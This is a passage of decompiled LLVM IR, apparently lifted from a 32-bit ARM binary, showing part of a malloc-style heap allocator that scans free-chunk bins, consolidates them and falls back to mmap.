  store i32 %v1_127e0, i32* %ip.global-to-local, align 4
  %v9_12850 = icmp eq i32 %v1_127e0, %v1_127ac
  br i1 %v9_12850, label %dec_label_pc_12858.loopexit, label %dec_label_pc_127b8

dec_label_pc_12858.loopexit:                      ; preds = %dec_label_pc_12850
  br label %dec_label_pc_12858

dec_label_pc_12858:                               ; preds = %dec_label_pc_127a0.dec_label_pc_12858_crit_edge, %dec_label_pc_12858.loopexit
  %v4_12888.pre-phi = phi i32 [ %.pre203, %dec_label_pc_127a0.dec_label_pc_12858_crit_edge ], [ %v4_127a8, %dec_label_pc_12858.loopexit ]
  %v1_12858 = add i32 %v0_12858.pre, 1
  store i32 %v1_12858, i32* %r2.global-to-local, align 4
  %v1_1285c = urem i32 %v1_12858, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r0.global-to-local, align 4
  %v6_12868 = shl i32 1, %v1_1285c
  store i32 %v6_12868, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12870 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12870, i32* %r3.global-to-local, align 4
  %v3_12874 = udiv i32 %v1_12858, 32
  store i32 %v3_12874, i32* @r5, align 4
  %v4_12878 = mul nuw nsw i32 %v3_12874, 4
  %v5_12878 = add i32 %v4_12870, %v4_12878
  store i32 %v5_12878, i32* %r2.global-to-local, align 4
  %v1_1287c = add i32 %v5_12878, 820
  %v2_1287c = inttoptr i32 %v1_1287c to i32*
  %v3_1287c = load i32, i32* %v2_1287c, align 4
  store i32 %v3_1287c, i32* @r4, align 4
  %v1_12880 = add i32 %v4_12870, 52
  store i32 %v1_12880, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_12888 = add i32 %v1_12880, %v4_12888.pre-phi
  store i32 %v5_12888, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1288c

dec_label_pc_1288c:                               ; preds = %dec_label_pc_128f4, %dec_label_pc_12858
  %v1_12894 = phi i32 [ %v1_12894.pre, %dec_label_pc_128f4 ], [ %v3_1287c, %dec_label_pc_12858 ]
  %v0_12894 = phi i32 [ %v0_1288c.pre, %dec_label_pc_128f4 ], [ %v6_12868, %dec_label_pc_12858 ]
  %v1_1288c = sub i32 1, %v0_12894
  %v2_1288c = icmp ult i32 %v0_12894, 2
  %v1_1288c. = select i1 %v2_1288c, i32 %v1_1288c, i32 0
  store i32 %v1_1288c., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_12894, %v1_12894
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_1288c
  %v5_12898 = or i32 %v1_1288c., 1
  store i32 %v5_12898, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_128a4.preheader

bb145:                                            ; preds = %dec_label_pc_1288c
  %v2_1289c = icmp eq i32 %v1_1288c., 0
  br i1 %v2_1289c, label %.dec_label_pc_128e0.preheader_crit_edge, label %dec_label_pc_128a4.preheader

.dec_label_pc_128e0.preheader_crit_edge:          ; preds = %bb145
  %v0_128d857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_128e0.preheader

dec_label_pc_128a4.preheader:                     ; preds = %bb145, %.thread15
  %v0_128a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_128a4

dec_label_pc_128a4:                               ; preds = %dec_label_pc_128a4.preheader, %dec_label_pc_128b0
  %v0_128a4 = phi i32 [ %v0_128a4.pre, %dec_label_pc_128a4.preheader ], [ %v1_128a4, %dec_label_pc_128b0 ]
  %v1_128a4 = add i32 %v0_128a4, 1
  store i32 %v1_128a4, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_128a4, 2
  br i1 %tmp211, label %dec_label_pc_12984.loopexit, label %dec_label_pc_128b0

dec_label_pc_128b0:                               ; preds = %dec_label_pc_128a4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r3.global-to-local, align 4
  %v1_128b4 = load i32, i32* @r8, align 4
  %v2_128b4 = add i32 %v1_128b4, ptrtoint (i32* @global_var_22204.365 to i32)
  %v3_128b4 = inttoptr i32 %v2_128b4 to i32*
  %v4_128b4 = load i32, i32* %v3_128b4, align 4
  store i32 %v4_128b4, i32* %r2.global-to-local, align 4
  %v4_128b8 = mul i32 %v1_128a4, 4
  %v5_128b8 = add i32 %v4_128b4, %v4_128b8
  store i32 %v5_128b8, i32* %r3.global-to-local, align 4
  %v1_128bc = add i32 %v5_128b8, 820
  %v2_128bc = inttoptr i32 %v1_128bc to i32*
  %v3_128bc = load i32, i32* %v2_128bc, align 4
  store i32 %v3_128bc, i32* @r4, align 4
  %v2_128c0 = icmp eq i32 %v3_128bc, 0
  br i1 %v2_128c0, label %dec_label_pc_128a4, label %dec_label_pc_128c8

dec_label_pc_128c8:                               ; preds = %dec_label_pc_128b0
  %v4_128c8 = mul i32 %v1_128a4, 256
  %v5_128c8 = add i32 %v4_128b4, %v4_128c8
  store i32 %v5_128c8, i32* %r3.global-to-local, align 4
  %v1_128cc = add i32 %v5_128c8, 44
  store i32 %v1_128cc, i32* %r0.global-to-local, align 4
  %v0_128d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_128d0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_128e0.preheader

dec_label_pc_128e0.preheader:                     ; preds = %.dec_label_pc_128e0.preheader_crit_edge, %dec_label_pc_128c8
  %v0_128d857 = phi i32 [ %v1_128cc, %dec_label_pc_128c8 ], [ %v0_128d857.pre, %.dec_label_pc_128e0.preheader_crit_edge ]
  %v0_128fc = phi i32 [ %v3_128bc, %dec_label_pc_128c8 ], [ %v1_12894, %.dec_label_pc_128e0.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_128d0, %dec_label_pc_128c8 ], [ %v0_12894, %.dec_label_pc_128e0.preheader_crit_edge ]
  %v2_128e054 = and i32 %ip.promoted, %v0_128fc
  %v4_128e056 = icmp eq i32 %v2_128e054, 0
  br i1 %v4_128e056, label %dec_label_pc_128d8, label %dec_label_pc_128e8

dec_label_pc_128d8:                               ; preds = %dec_label_pc_128e0.preheader, %dec_label_pc_128d8
  %v2_128dc59 = phi i32 [ %v2_128dc, %dec_label_pc_128d8 ], [ %ip.promoted, %dec_label_pc_128e0.preheader ]
  %v0_128d858 = phi i32 [ %v1_128d8, %dec_label_pc_128d8 ], [ %v0_128d857, %dec_label_pc_128e0.preheader ]
  %v1_128d8 = add i32 %v0_128d858, 8
  %v2_128dc = mul i32 %v2_128dc59, 2
  %v2_128e0 = and i32 %v2_128dc, %v0_128fc
  %v4_128e0 = icmp eq i32 %v2_128e0, 0
  br i1 %v4_128e0, label %dec_label_pc_128d8, label %dec_label_pc_128e0.dec_label_pc_128e8_crit_edge

dec_label_pc_128e0.dec_label_pc_128e8_crit_edge:  ; preds = %dec_label_pc_128d8
  store i32 %v1_128d8, i32* %r0.global-to-local, align 4
  store i32 %v2_128dc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_128e8

dec_label_pc_128e8:                               ; preds = %dec_label_pc_128e0.dec_label_pc_128e8_crit_edge, %dec_label_pc_128e0.preheader
  %v0_12908 = phi i32 [ %v2_128dc, %dec_label_pc_128e0.dec_label_pc_128e8_crit_edge ], [ %ip.promoted, %dec_label_pc_128e0.preheader ]
  %v0_1292c = phi i32 [ %v1_128d8, %dec_label_pc_128e0.dec_label_pc_128e8_crit_edge ], [ %v0_128d857, %dec_label_pc_128e0.preheader ]
  %v1_128e8 = add i32 %v0_1292c, 12
  %v2_128e8 = inttoptr i32 %v1_128e8 to i32*
  %v3_128e8 = load i32, i32* %v2_128e8, align 4
  store i32 %v3_128e8, i32* @lr, align 4
  %v9_128ec = icmp eq i32 %v3_128e8, %v0_1292c
  br i1 %v9_128ec, label %dec_label_pc_128f4, label %dec_label_pc_12914

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128e8
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r0.global-to-local, align 4
  %v1_128f8 = load i32, i32* @r8, align 4
  %v2_128f8 = add i32 %v1_128f8, ptrtoint (i32* @global_var_22204.365 to i32)
  %v3_128f8 = inttoptr i32 %v2_128f8 to i32*
  %v4_128f8 = load i32, i32* %v3_128f8, align 4
  %v2_128fc = sub i32 -1, %v0_12908
  %v3_128fc = and i32 %v0_128fc, %v2_128fc
  store i32 %v3_128fc, i32* @r4, align 4
  %v1_12900 = load i32, i32* @r5, align 4
  %v4_12900 = mul i32 %v1_12900, 4
  %v5_12900 = add i32 %v4_12900, %v4_128f8
  store i32 %v5_12900, i32* %r3.global-to-local, align 4
  %v1_12904 = add i32 %v0_1292c, 8
  store i32 %v1_12904, i32* %r0.global-to-local, align 4
  %v2_12908 = mul i32 %v0_12908, 2
  store i32 %v2_12908, i32* %ip.global-to-local, align 4
  %v2_1290c = add i32 %v5_12900, 820
  %v3_1290c = inttoptr i32 %v2_1290c to i32*
  store i32 %v3_128fc, i32* %v3_1290c, align 4
  %v0_1288c.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_12894.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1288c

dec_label_pc_12914:                               ; preds = %dec_label_pc_128e8
  %v1_12914 = add i32 %v3_128e8, 4
  %v2_12914 = inttoptr i32 %v1_12914 to i32*
  %v3_12914 = load i32, i32* %v2_12914, align 4
  store i32 %v3_12914, i32* %r3.global-to-local, align 4
  %v1_12918 = and i32 %v3_12914, -4
  store i32 %v1_12918, i32* %r2.global-to-local, align 4
  %v0_1291c = load i32, i32* @sl, align 4
  %v2_1291c = sub i32 %v1_12918, %v0_1291c
  store i32 %v2_1291c, i32* %ip.global-to-local, align 4
  %v1_12920 = add i32 %v3_128e8, 12
  %v2_12920 = inttoptr i32 %v1_12920 to i32*
  %v3_12920 = load i32, i32* %v2_12920, align 4
  store i32 %v3_12920, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_1291c, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_12914
  %v6_12928 = add i32 %v1_12918, %v3_128e8
  store i32 %v6_12928, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_12914, %bb146
  %v2_1292c = add i32 %v3_12920, 8
  %v3_1292c = inttoptr i32 %v2_1292c to i32*
  store i32 %v0_1292c, i32* %v3_1292c, align 4
  %v0_12930 = load i32, i32* %r3.global-to-local, align 4
  %v1_12930 = load i32, i32* %r0.global-to-local, align 4
  %v2_12930 = add i32 %v1_12930, 12
  %v3_12930 = inttoptr i32 %v2_12930 to i32*
  store i32 %v0_12930, i32* %v3_12930, align 4
  %v4_12934 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_12810_crit_edge, label %dec_label_pc_12940

.dec_label_pc_12810_crit_edge:                    ; preds = %bb147
  %v5_12934 = add i32 %v4_12934, 8
  store i32 %v5_12934, i32* %r4.global-to-local, align 4
  %v4_12938 = load i32, i32* %r2.global-to-local, align 4
  %v5_12938 = add i32 %v4_12938, 4
  %v6_12938 = inttoptr i32 %v5_12938 to i32*
  %v7_12938 = load i32, i32* %v6_12938, align 4
  store i32 %v7_12938, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12810

dec_label_pc_12940:                               ; preds = %bb147
  %v1_12940 = load i32, i32* @sl, align 4
  %v2_12940 = add i32 %v1_12940, %v4_12934
  store i32 %v2_12940, i32* %r1.global-to-local, align 4
  %v1_12948 = load i32, i32* @r6, align 4
  %v2_12948 = add i32 %v1_12948, 8
  %v3_12948 = inttoptr i32 %v2_12948 to i32*
  store i32 %v2_12940, i32* %v3_12948, align 4
  %v0_1294c = load i32, i32* %r1.global-to-local, align 4
  %v1_1294c = load i32, i32* @r6, align 4
  %v2_1294c = add i32 %v1_1294c, 12
  %v3_1294c = inttoptr i32 %v2_1294c to i32*
  store i32 %v0_1294c, i32* %v3_1294c, align 4
  %v0_12950 = load i32, i32* @r6, align 4
  %v1_12950 = load i32, i32* %r1.global-to-local, align 4
  %v2_12950 = add i32 %v1_12950, 8
  %v3_12950 = inttoptr i32 %v2_12950 to i32*
  store i32 %v0_12950, i32* %v3_12950, align 4
  %v0_12954 = load i32, i32* @r6, align 4
  %v1_12954 = load i32, i32* %r1.global-to-local, align 4
  %v2_12954 = add i32 %v1_12954, 12
  %v3_12954 = inttoptr i32 %v2_12954 to i32*
  store i32 %v0_12954, i32* %v3_12954, align 4
  %tmp213 = icmp ult i32 %v1_12940, 256
  br i1 %tmp213, label %bb148, label %.thread124

bb148:                                            ; preds = %dec_label_pc_12940
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  %v8_12960 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v8_12960, i32* %r3.global-to-local, align 4
  %v4_12964 = load i32, i32* %r1.global-to-local, align 4
  %v6_12964 = add i32 %v8_12960, 48
  %v7_12964 = inttoptr i32 %v6_12964 to i32*
  store i32 %v4_12964, i32* %v7_12964, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_12940, %bb148
  %v0_12968 = load i32, i32* @sl, align 4
  %v1_12968 = or i32 %v0_12968, 1
  store i32 %v1_12968, i32* %r2.global-to-local, align 4
  %v0_1296c = load i32, i32* %ip.global-to-local, align 4
  %v1_1296c = or i32 %v0_1296c, 1
  store i32 %v1_1296c, i32* %r3.global-to-local, align 4
  %v0_12970 = load i32, i32* @lr, align 4
  %v1_12970 = add i32 %v0_12970, 8
  store i32 %v1_12970, i32* %r4.global-to-local, align 4
  %v2_12974 = add i32 %v0_12970, 4
  %v3_12974 = inttoptr i32 %v2_12974 to i32*
  store i32 %v1_12968, i32* %v3_12974, align 4
  %v0_12978 = load i32, i32* %ip.global-to-local, align 4
  %v1_12978 = load i32, i32* %r1.global-to-local, align 4
  %v3_12978 = add i32 %v1_12978, %v0_12978
  %v4_12978 = inttoptr i32 %v3_12978 to i32*
  store i32 %v0_12978, i32* %v4_12978, align 4
  %v0_1297c = load i32, i32* %r3.global-to-local, align 4
  %v1_1297c = load i32, i32* %r1.global-to-local, align 4
  %v2_1297c = add i32 %v1_1297c, 4
  %v3_1297c = inttoptr i32 %v2_1297c to i32*
  store i32 %v0_1297c, i32* %v3_1297c, align 4
  br label %dec_label_pc_12dd8

dec_label_pc_12984.loopexit:                      ; preds = %dec_label_pc_128a4
  br label %dec_label_pc_12984

dec_label_pc_12984:                               ; preds = %dec_label_pc_12984.loopexit, %dec_label_pc_12598, %dec_label_pc_125a0
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %ip.global-to-local, align 4
  %v4_1298c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_1298c, i32* @r0, align 4
  %v1_12990 = add i32 %v4_1298c, 44
  %v2_12990 = inttoptr i32 %v1_12990 to i32*
  %v3_12990 = load i32, i32* %v2_12990, align 4
  store i32 %v3_12990, i32* %ip.global-to-local, align 4
  %v1_12994 = add i32 %v3_12990, 4
  %v2_12994 = inttoptr i32 %v1_12994 to i32*
  %v3_12994 = load i32, i32* %v2_12994, align 4
  %v0_12998 = load i32, i32* @sl, align 4
  %v1_12998 = add i32 %v0_12998, 16
  store i32 %v1_12998, i32* %r1.global-to-local, align 4
  %v1_1299c = and i32 %v3_12994, -4
  store i32 %v1_1299c, i32* %r3.global-to-local, align 4
  %v3_129a0 = icmp ult i32 %v1_1299c, %v1_12998
  br i1 %v3_129a0, label %dec_label_pc_129d0, label %dec_label_pc_129ac

dec_label_pc_129ac:                               ; preds = %dec_label_pc_12984
  %v2_129ac = sub i32 %v1_1299c, %v0_12998
  %v2_129b0 = add i32 %v0_12998, %v3_12990
  store i32 %v2_129b0, i32* %r1.global-to-local, align 4
  %v1_129b4 = or i32 %v2_129ac, 1
  store i32 %v1_129b4, i32* %r3.global-to-local, align 4
  %v1_129b8 = or i32 %v0_12998, 1
  store i32 %v1_129b8, i32* %r2.global-to-local, align 4
  %v1_129bc = add i32 %v3_12990, 8
  store i32 %v1_129bc, i32* %r4.global-to-local, align 4
  store i32 %v1_129b8, i32* %v2_12994, align 4
  %v0_129c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_129c4 = load i32, i32* @r0, align 4
  %v2_129c4 = add i32 %v1_129c4, 44
  %v3_129c4 = inttoptr i32 %v2_129c4 to i32*
  store i32 %v0_129c4, i32* %v3_129c4, align 4
  %v0_129c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_129c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_129c8 = add i32 %v1_129c8, 4
  %v3_129c8 = inttoptr i32 %v2_129c8 to i32*
  store i32 %v0_129c8, i32* %v3_129c8, align 4
  br label %dec_label_pc_12dd8

dec_label_pc_129d0:                               ; preds = %dec_label_pc_12984
  %v1_129d0 = inttoptr i32 %v4_1298c to i32*
  %v2_129d0 = load i32, i32* %v1_129d0, align 4
  store i32 %v2_129d0, i32* %r3.global-to-local, align 4
  %v1_129d4 = and i32 %v2_129d0, 2
  store i32 %v1_129d4, i32* %ip.global-to-local, align 4
  %v2_129d4 = icmp eq i32 %v1_129d4, 0
  %v1_129d8 = add i32 %v4_1298c, 860
  %v2_129d8 = inttoptr i32 %v1_129d8 to i32*
  %v3_129d8 = load i32, i32* %v2_129d8, align 4
  store i32 %v3_129d8, i32* %r1.global-to-local, align 4
  br i1 %v2_129d4, label %dec_label_pc_129f0, label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129d0
  %v0_129e0 = call i32 @__malloc_consolidate()
  %v0_129e4 = load i32, i32* @sl, align 4
  %v1_129e4 = add i32 %v0_129e4, -7
  store i32 %v1_129e4, i32* @r0, align 4
  %v0_129e8 = call i32 @malloc()
  store i32 %v0_129e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12dd4

dec_label_pc_129f0:                               ; preds = %dec_label_pc_129d0
  %v1_129f0 = add i32 %v4_1298c, 844
  %v2_129f0 = inttoptr i32 %v1_129f0 to i32*
  %v3_129f0 = load i32, i32* %v2_129f0, align 4
  store i32 %v3_129f0, i32* %r3.global-to-local, align 4
  %v3_129f4 = icmp ult i32 %v0_12998, %v3_129f0
  %v1_129f8 = add i32 %v3_129d8, -1
  store i32 %v1_129f8, i32* %sb.global-to-local, align 4
  br i1 %v3_129f4, label %dec_label_pc_12acc, label %dec_label_pc_12a00

dec_label_pc_12a00:                               ; preds = %dec_label_pc_129f0
  %v1_12a00 = add i32 %v4_1298c, 852
  %v2_12a00 = inttoptr i32 %v1_12a00 to i32*
  %v3_12a00 = load i32, i32* %v2_12a00, align 4
  store i32 %v3_12a00, i32* %r2.global-to-local, align 4
  %v1_12a04 = add i32 %v4_1298c, 848
  %v2_12a04 = inttoptr i32 %v1_12a04 to i32*
  %v3_12a04 = load i32, i32* %v2_12a04, align 4
  store i32 %v3_12a04, i32* %r3.global-to-local, align 4
  %v6_12a0c = icmp slt i32 %v3_12a04, %v3_12a00
  br i1 %v6_12a0c, label %dec_label_pc_12a10, label %dec_label_pc_12acc

dec_label_pc_12a10:                               ; preds = %dec_label_pc_12a00
  %v1_12a10 = add i32 %v0_12998, 10
  %v2_12a14 = add i32 %v1_12a10, %v3_129d8
  store i32 %v2_12a14, i32* %r3.global-to-local, align 4
  %v2_12a18 = sub i32 0, %v3_129d8
  %v3_12a18 = and i32 %v2_12a14, %v2_12a18
  store i32 %v3_12a18, i32* @r4, align 4
  %tmp214 = icmp ugt i32 %v3_12a18, %v0_12998
  br i1 %tmp214, label %dec_label_pc_12a24, label %dec_label_pc_12acc

dec_label_pc_12a24:                               ; preds = %dec_label_pc_12a10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_12a18, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12a3c = call i32 @mmap(i32 0, i32 %v3_12a18, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12a3c, i32* %r0.global-to-local, align 4
  %v7_12a40 = icmp eq i32 %v6_12a3c, -1
  br i1 %v7_12a40, label %dec_label_pc_12a24.dec_label_pc_12acc_crit_edge, label %dec_label_pc_12a48

dec_label_pc_12a24.dec_label_pc_12acc_crit_edge:  ; preds = %dec_label_pc_12a24
  %v1_12af0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_12acc

dec_label_pc_12a48:                               ; preds = %dec_label_pc_12a24
  %v1_12a48 = urem i32 %v6_12a3c, 8
  store i32 %v1_12a48, i32* %r2.global-to-local, align 4
  %v2_12a48 = icmp eq i32 %v1_12a48, 0
  br i1 %v2_12a48, label %bb149, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_12a48
  %v2_12a4c = sub nsw i32 8, %v1_12a48
  store i32 %v2_12a4c, i32* %r3.global-to-local, align 4
  %v2_12a50 = load i32, i32* @r4, align 4
  %v3_12a50 = sub i32 %v2_12a50, %v2_12a4c
  %v3_12a54 = add i32 %v2_12a4c, %v6_12a3c
  store i32 %v3_12a54, i32* %lr.global-to-local, align 4
  %v2_12a5c = or i32 %v3_12a50, 2
  store i32 %v2_12a5c, i32* %r2.global-to-local, align 4
  %v5_12a64 = inttoptr i32 %v3_12a54 to i32*
  store i32 %v2_12a4c, i32* %v5_12a64, align 4
  %v1_12a68 = load i32, i32* %r2.global-to-local, align 4
  %v2_12a68 = load i32, i32* %lr.global-to-local, align 4
  %v3_12a68 = add i32 %v2_12a68, 4
  %v4_12a68 = inttoptr i32 %v3_12a68 to i32*
  store i32 %v1_12a68, i32* %v4_12a68, align 4
  br label %.thread30

bb149:                                            ; preds = %dec_label_pc_12a48
  store i32 %v6_12a3c, i32* %lr.global-to-local, align 4
  %v1_12a6050 = load i32, i32* @r4, align 4
  %v2_12a6051 = or i32 %v1_12a6050, 2
  store i32 %v2_12a6051, i32* %r3.global-to-local, align 4
  %v3_12a6c = inttoptr i32 %v6_12a3c to i32*
  store i32 0, i32* %v3_12a6c, align 4
  %v1_12a70 = load i32, i32* %r3.global-to-local, align 4
  %v2_12a70 = load i32, i32* %lr.global-to-local, align 4
  %v3_12a70 = add i32 %v2_12a70, 4
  %v4_12a70 = inttoptr i32 %v3_12a70 to i32*
  store i32 %v1_12a70, i32* %v4_12a70, align 4
  br label %.thread30

.thread30:                                        ; preds = %.thread28, %bb149
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12a7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12a7c, i32* %ip.global-to-local, align 4
  %v1_12a80 = add i32 %v4_12a7c, 848
  %v2_12a80 = inttoptr i32 %v1_12a80 to i32*
  %v3_12a80 = load i32, i32* %v2_12a80, align 4
  store i32 %v3_12a80, i32* %r3.global-to-local, align 4
  %v1_12a84 = add i32 %v4_12a7c, 856
  %v2_12a84 = inttoptr i32 %v1_12a84 to i32*
  %v3_12a84 = load i32, i32* %v2_12a84, align 4
  store i32 %v3_12a84, i32* %r2.global-to-local, align 4
  %v1_12a88 = add i32 %v3_12a80, 1
  store i32 %v1_12a88, i32* %r3.global-to-local, align 4
  %v7_12a90 = icmp sgt i32 %v1_12a88, %v3_12a84
  br i1 %v7_12a90, label %bb150, label %bb151

bb150:                                            ; preds = %.thread30
  store i32 %v1_12a88, i32* %v2_12a84, align 4
  %v0_12a94.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12a94.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb151

bb151:                                            ; preds = %.thread30, %bb150
  %v1_12a94 = phi i32 [ %v4_12a7c, %.thread30 ], [ %v1_12a94.pre, %bb150 ]
  %v0_12a94 = phi i32 [ %v1_12a88, %.thread30 ], [ %v0_12a94.pre, %bb150 ]
  %v2_12a94 = add i32 %v1_12a94, 848
  %v3_12a94 = inttoptr i32 %v2_12a94 to i32*
  store i32 %v0_12a94, i32* %v3_12a94, align 4
  %v0_12a98 = load i32, i32* %ip.global-to-local, align 4
  %v1_12a98 = add i32 %v0_12a98, 868
  %v2_12a98 = inttoptr i32 %v1_12a98 to i32*
  %v3_12a98 = load i32, i32* %v2_12a98, align 4
  store i32 %v3_12a98, i32* %r3.global-to-local, align 4
  %v1_12a9c = add i32 %v0_12a98, 880
  %v2_12a9c = inttoptr i32 %v1_12a9c to i32*
  %v3_12a9c = load i32, i32* %v2_12a9c, align 4
  store i32 %v3_12a9c, i32* %r2.global-to-local, align 4
  %v0_12aa0 = load i32, i32* @r4, align 4
  %v2_12aa0 = add i32 %v0_12aa0, %v3_12a98
  store i32 %v2_12aa0, i32* %r1.global-to-local, align 4
  %v1_12aa4 = add i32 %v0_12a98, 872
  %v2_12aa4 = inttoptr i32 %v1_12aa4 to i32*
  %v3_12aa4 = load i32, i32* %v2_12aa4, align 4
  store i32 %v3_12aa4, i32* %r3.global-to-local, align 4
  %v1_12aac = add i32 %v0_12a98, 884
  %v2_12aac = inttoptr i32 %v1_12aac to i32*
  %v3_12aac = load i32, i32* %v2_12aac, align 4
  store i32 %v3_12aac, i32* %r2.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_12aa0, %v3_12a9c
  br i1 %tmp215, label %bb152, label %bb153

bb152:                                            ; preds = %bb151
  store i32 %v2_12aa0, i32* %v2_12a9c, align 4
  %v0_12ab4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12ab4.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %bb151, %bb152
  %v1_12ab4 = phi i32 [ %v0_12a98, %bb151 ], [ %v1_12ab4.pre, %bb152 ]
  %v0_12ab4 = phi i32 [ %v2_12aa0, %bb151 ], [ %v0_12ab4.pre, %bb152 ]
  %v2_12ab4 = add i32 %v1_12ab4, 868
  %v3_12ab4 = inttoptr i32 %v2_12ab4 to i32*
  store i32 %v0_12ab4, i32* %v3_12ab4, align 4
  %v0_12ab8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12ab8 = load i32, i32* %r3.global-to-local, align 4
  %v2_12ab8 = add i32 %v1_12ab8, %v0_12ab8
  store i32 %v2_12ab8, i32* %r1.global-to-local, align 4
  %v1_12abc = load i32, i32* %r2.global-to-local, align 4
  %v0_12ac0 = load i32, i32* %lr.global-to-local, align 4
  %v1_12ac0 = add i32 %v0_12ac0, 8
  store i32 %v1_12ac0, i32* %r0.global-to-local, align 4
  %tmp216 = icmp ugt i32 %v2_12ab8, %v1_12abc
  br i1 %tmp216, label %bb154, label %dec_label_pc_12dd4

bb154:                                            ; preds = %bb153
  %v5_12ac4 = load i32, i32* %ip.global-to-local, align 4
  %v6_12ac4 = add i32 %v5_12ac4, 884
  %v7_12ac4 = inttoptr i32 %v6_12ac4 to i32*
  store i32 %v2_12ab8, i32* %v7_12ac4, align 4
  br label %dec_label_pc_12dd4

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12a10, %dec_label_pc_129f0, %dec_label_pc_12a24.dec_label_pc_12acc_crit_edge, %dec_label_pc_12a00
  %v1_12af0 = phi i32 [ %v1_12af0.pre, %dec_label_pc_12a24.dec_label_pc_12acc_crit_edge ], [ %v0_12998, %dec_label_pc_12a00 ], [ %v0_12998, %dec_label_pc_129f0 ], [ %v0_12998, %dec_label_pc_12a10 ]
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %ip.global-to-local, align 4
  %v4_12ad4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 64) to i32*), align 4
  store i32 %v4_12ad4, i32* %r3.global-to-local, align 4
  %v1_12ad8 = add i32 %v4_12ad4, 44
  %v2_12ad8 = inttoptr i32 %v1_12ad8 to i32*
  %v3_12ad8 = load i32, i32* %v2_12ad8, align 4
  store i32 %v3_12ad8, i32* %r0.global-to-local, align 4
  %v1_12adc = add i32 %v4_12ad4, 864
  %v2_12adc = inttoptr i32 %v1_12adc to i32*
  %v3_12adc = load i32, i32* %v2_12adc, align 4
  store i32 %v3_12adc, i32* %r2.global-to-local, align 4
  %v1_12ae0 = add i32 %v4_12ad4, 840
  %v2_12ae0 = inttoptr i32 %v1_12ae0 to i32*
  %v3_12ae0 = load i32, i32* %v2_12ae0, align 4
  store i32 %v3_12ae0, i32* %r3.global-to-local, align 4
  %v1_12ae4 = add i32 %v3_12ad8, 4
  %v2_12ae4 = inttoptr i32 %v1_12ae4 to i32*
  %v3_12ae4 = load i32, i32* %v2_12ae4, align 4
  store i32 %v3_12ae4, i32* %r1.global-to-local, align 4
  %v1_12aec = urem i32 %v3_12adc, 2
  %v2_12aec = icmp eq i32 %v1_12aec, 0
  %v1_12ae8 = add i32 %v1_12af0, 16
  %v2_12af0 = add i32 %v1_12ae8, %v3_12ae0
  store i32 %v2_12af0, i32* %r3.global-to-local, align 4
  %v1_12af4 = and i32 %v3_12ae4, -4
  store i32 %v1_12af4, i32* @r8, align 4
  br i1 %v2_12aec, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_12acc
  %v3_12af8 = sub i32 %v2_12af0, %v1_12af4
  store i32 %v3_12af8, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_12acc, %bb155
